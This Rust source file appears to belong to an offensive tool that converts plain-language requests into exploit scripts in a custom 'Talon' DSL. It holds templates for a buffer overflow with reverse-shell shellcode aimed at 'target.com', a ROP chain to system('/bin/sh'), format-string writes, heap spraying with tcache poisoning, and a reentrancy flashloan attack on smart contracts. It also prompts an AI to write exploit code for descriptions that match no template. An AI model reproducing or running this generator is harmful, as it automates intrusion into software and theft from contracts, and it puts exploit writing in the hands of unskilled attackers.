// NATURAL LANGUAGE INTERFACE
// Convert natural language to Talon DSL

use crate::ai_exploit::AIExploitGenerator;
use regex::Regex;

pub struct NaturalLanguageProcessor {
    pub ai_generator: AIExploitGenerator,
}

impl NaturalLanguageProcessor {
    pub fn new() -> Self {
        NaturalLanguageProcessor {
            ai_generator: AIExploitGenerator::new(),
        }
    }

    pub async fn parse_natural_language(&self, input: &str) -> Result<String, String> {
        log::info!("Parsing natural language: {}", input);

        let talon_code = if let Some(code) = self.try_pattern_matching(input) {
            code
        } else {
            self.ai_translate(input).await?
        };

        log::info!("Generated Talon code:\n{}", talon_code);
        Ok(talon_code)
    }

    fn try_pattern_matching(&self, input: &str) -> Option<String> {
        let input_lower = input.to_lowercase();

        if input_lower.contains("buffer overflow") && input_lower.contains("reverse shell") {
            return Some(self.generate_buffer_overflow_exploit(&input_lower));
        }

        if input_lower.contains("rop chain") || input_lower.contains("rop gadget") {
            return Some(self.generate_rop_exploit(&input_lower));
        }

        if input_lower.contains("format string") {
            return Some(self.generate_format_string_exploit(&input_lower));
        }

        if input_lower.contains("heap")
            && (input_lower.contains("spray") || input_lower.contains("feng shui"))
        {
            return Some(self.generate_heap_exploit(&input_lower));
        }

        if input_lower.contains("symbolic") || input_lower.contains("constraint") {
            return Some(self.generate_symbolic_execution(&input_lower));
        }

        if input_lower.contains("smart contract") || input_lower.contains("solidity") {
            return Some(self.generate_smart_contract_audit(&input_lower));
        }

        None
    }

    fn generate_buffer_overflow_exploit(&self, input: &str) -> String {
        let binary = self.extract_binary_name(input).unwrap_or("target");
        let port = self.extract_port(input).unwrap_or(4444);

        format!(
            r#"# Auto-generated buffer overflow exploit
analyze binary "{binary}"
find vulnerability type=buffer_overflow

let padding = cyclic(300)
let ret_addr = find_rop_gadget("{binary}", "pop rdi; ret")
let shellcode = generate_shellcode(reverse_shell, lhost="0.0.0.0", lport={port})

let exploit = padding + p64(ret_addr) + shellcode

connect to "target.com" on port 9999
send exploit
interactive
"#,
            binary = binary,
            port = port
        )
    }

    fn generate_rop_exploit(&self, input: &str) -> String {
        let binary = self.extract_binary_name(input).unwrap_or("binary");

        format!(
            r#"# Auto-generated ROP chain exploit
resolve rop chain in "{binary}"

let pop_rdi = find_gadget("{binary}", "pop rdi; ret")
let pop_rsi = find_gadget("{binary}", "pop rsi; ret")
let ret = find_gadget("{binary}", "ret")

let libc_base = leak_libc_base()
let system = libc_base + 0x050d60
let binsh = libc_base + 0x1b3e1a

let rop_chain = [
    p64(pop_rdi),
    p64(binsh),
    p64(ret),
    p64(system)
]

let payload = cyclic(264) + rop_chain
"#,
            binary = binary
        )
    }

    fn generate_format_string_exploit(&self, input: &str) -> String {
        let binary = self.extract_binary_name(input).unwrap_or("vuln");

        format!(
            r#"# Auto-generated format string exploit
find format offset for "{binary}"

let offset = 6
let target_addr = 0x601048

let writes = {{
    target_addr: 0xdeadbeef
}}

let payload = generate_format_string(offset, writes)
"#,
            binary = binary
        )
    }

    fn generate_heap_exploit(&self, _input: &str) -> String {
        format!(
            r#"# Auto-generated heap exploitation
heap_groom target: 0x603000
    spray size=0x100 count=100
    free indices=[50, 51, 52]
    allocate size=0x100 containing=p64(0xdeadbeef)
end

let tcache_poison = craft_tcache_poison(target=0x601000)
"#
        )
    }

    fn generate_symbolic_execution(&self, input: &str) -> String {
        let target_addr = self.extract_address(input).unwrap_or(0x08048abc);

        format!(
            r#"# Auto-generated symbolic execution
symbolic let buffer = bytes(256)
constrain buffer[0] != 0x00
constrain buffer[1..4] == "FLAG"

solve to reach 0x{:x}
"#,
            target_addr
        )
    }

    fn generate_smart_contract_audit(&self, input: &str) -> String {
        let contract = self.extract_contract_name(input).unwrap_or("contract.sol");

        format!(
            r#"# Auto-generated smart contract audit
audit solidity "{contract}"
    detect: [reentrancy, integer_overflow, unchecked_call]
    auto_exploit: true
end

flashloan attack
    borrow 100000 ETH
    reentrancy on withdraw()
end
"#,
            contract = contract
        )
    }

    async fn ai_translate(&self, input: &str) -> Result<String, String> {
        log::info!("Using AI to translate natural language");

        let prompt = format!(
            r#"Convert the following natural language exploit description to Talon DSL code:

{}

Generate only valid Talon code with no explanation. Use appropriate Talon primitives like:
- find_one_gadget(), find_magic(), p64(), u64()
- symbolic let, constrain, solve to reach
- auto_exploit, debug attach
- heap_groom, kernel_exploit
- audit solidity, flashloan attack

Talon code:"#,
            input
        );

        let talon_code = self.ai_generator.complete_text(&prompt, 500).await?;

        Ok(talon_code.trim().to_string())
    }

    fn extract_binary_name<'a>(&self, input: &'a str) -> Option<&'a str> {
        let re = Regex::new(r#"binary\s+["']?([a-zA-Z0-9_./]+)["']?"#).ok()?;
        re.captures(input)?.get(1).map(|m| m.as_str())
    }

    fn extract_port(&self, input: &str) -> Option<u16> {
        let re = Regex::new(r"port\s+(\d+)").ok()?;
        re.captures(input)?.get(1)?.as_str().parse().ok()
    }

    fn extract_address(&self, input: &str) -> Option<u64> {
        let re = Regex::new(r"0x([0-9a-fA-F]+)").ok()?;
        let hex = re.captures(input)?.get(1)?.as_str();
        u64::from_str_radix(hex, 16).ok()
    }

    fn extract_contract_name<'a>(&self, input: &'a str) -> Option<&'a str> {
        let re = Regex::new(r"contract\s+([a-zA-Z0-9_]+\.sol)").ok()?;
        re.captures(input)?.get(1).map(|m| m.as_str())
    }
}
